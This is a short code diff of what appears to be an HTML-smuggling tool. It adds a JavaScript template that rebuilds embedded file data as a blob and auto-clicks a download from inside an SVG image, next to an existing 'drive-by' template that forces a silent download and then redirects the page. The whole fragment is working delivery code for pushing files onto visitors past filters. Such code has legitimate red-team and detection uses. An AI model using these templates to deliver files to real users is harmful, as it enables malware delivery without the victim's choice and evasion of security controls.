@@ -16,5 +16,7 @@ JS_SHOW_TEXT = 'setTimeout(()=>{let d=document.open(); d.write("<!DOCTYPE html><
 
 JS_DOWNLOAD = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<h1>Unpacked {{NAME}}</h1><a href="${u}" download="{{NAME}}">Click here to download</a>`'
 
+JS_DOWNLOAD_SVG = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);let a=document.createElementNS("http://www.w3.org/1999/xhtml","a");document.querySelector("svg").appendChild(a);a.href=u;a.download="{{NAME}}";a.click();a.innerText="Download {{NAME}}"'
+
 JS_DRIVEBY_REDIRECT = 'let b=new Blob([og_data],{type:"application/octet-stream"});let u=URL.createObjectURL(b);document.body.innerHTML=`<a href="${u}" download="{{NAME}}" id="auto-click"></a>`;document.getElementById("auto-click").click();location.href="{{REDIRECT_URL}}"'
 
